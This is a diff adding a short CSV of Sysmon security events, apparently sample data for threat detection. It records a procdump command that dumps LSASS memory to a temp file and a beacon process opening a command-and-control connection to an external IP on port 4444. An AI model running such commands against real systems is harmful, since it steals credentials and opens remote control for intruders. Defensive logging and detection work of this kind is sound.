@@ -1,0 +1,4 @@
+_time,EventCode,Computer,User,SourceImage,TargetImage,GrantedAccess,IpAddress,DestIp,DestPort,CommandLine,Status,Description
+2026-04-18 15:12:05,Sysmon 10,FIN-WS-09,CORP\cjohnson,C:\Windows\Temp\procdump64.exe,C:\Windows\System32\lsass.exe,0x1fffff,-,-,-,procdump64.exe -ma lsass.exe C:\Windows\Temp\lsass.dmp,0x1fffff,LSASS process memory handle granted with full access mask
+2026-04-18 15:12:09,Sysmon 11,FIN-WS-09,CORP\cjohnson,C:\Windows\Temp\procdump64.exe,-,-,-,-,-,FileCreated C:\Windows\Temp\lsass.dmp,0x0,Credential dump archive written to temporary staging directory
+2026-04-18 15:16:01,Sysmon 3,FIN-WS-09,CORP\cjohnson,C:\Windows\Temp\beacon.exe,-,-,192.168.10.42,185.220.101.5,4444,beacon.exe --connect 185.220.101.5:4444,Established,Periodic outbound C2 socket connection on port 4444 (30s interval)
